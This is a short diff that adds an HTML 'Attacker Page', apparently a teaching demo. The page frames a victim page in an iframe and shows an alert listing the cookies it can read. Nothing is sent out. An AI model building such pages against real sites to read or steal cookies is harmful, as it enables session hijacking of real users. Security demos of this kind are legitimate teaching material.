@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Attacker Page</h1>
+<iframe src="/victim/victim.html"></iframe>
+
+<script>
+setTimeout(() => {
+  alert("Cookies I can read: " + document.cookie);
+}, 2000);
+</script>
+</body>
+</html>
